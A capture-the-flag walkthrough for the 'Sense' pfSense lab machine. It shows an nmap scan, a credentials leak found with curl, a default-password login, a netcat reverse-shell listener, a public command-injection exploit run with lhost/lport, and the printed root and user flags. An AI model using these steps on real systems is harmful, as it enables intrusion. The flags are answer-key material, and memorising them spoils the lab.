Sense Walkthrough
**********************

Nmap
#########

We first start with running nmap

.. code-block:: console

	nmap -sC -sV -T4 sense | tee sense.nmap   
	PORT    STATE SERVICE  VERSION 
	
	80/tcp  open  http     lighttpd 1.4.35 
	
	|_http-server-header: lighttpd/1.4.35 
	
	|_http-title: Did not follow redirect to https://sense/ 
	
	443/tcp open  ssl/http lighttpd 1.4.35 
	
	|_ssl-date: TLS randomness does not represent time 
	
	| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US 
	
	| Not valid before: 2017-10-14T19:21:35 
	
	|_Not valid after:  2023-04-06T19:21:35 
	
	|_http-title: 501 
	
	|_http-server-header: lighttpd/1.4.35 
	
	| http-cookie-flags:	
	
	|   /:  
	
	|     PHPSESSID:  
	
	|_      httponly flag not set 

We see that both the html ports are up. We need to check them out

Web enumeration
###################

We find `https://10.10.10.60/changelog.txt` through our web enumeration. 

We also find that we can get some system-users information through using curl
 
.. code-block:: console

	curl -k https://10.10.10.60/system-users.txt 
	####Support ticket### 
	Please create the following user 
		username: Rohit 
		password: company defaults    

 Understanding pfsense. The default password is `pfsense` so we try that and it works

.. code-block:: console

	rohit:pfsense 

*NOTE* When logged in, it has information disclosure vuls by giving us the hostname, version of the kernel and OS, and etc.

Inital Shell
#################

We then try to find an PE exploit for sense.

.. code-block::console

	Searchsploit pfsense 
	pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                   | php/webapps/43560.py
	Searchsploit –m 43560 
	Nc –lvnp 4444 # on kali machine 
	python3 43560.py --rhost 10.10.10.60 --username rohit --password pfsense --lhost 10.10.14.20 --lport 4444 

You then are able to get user and root flags.

.. code-block:: console

	# cat root.txt 
		D08c32a5d4f8c8b10e76eb51a69f1a86 
	cat /home/rohit/user.txt 
		8721327cc232073b40d27d9c17e7348b 
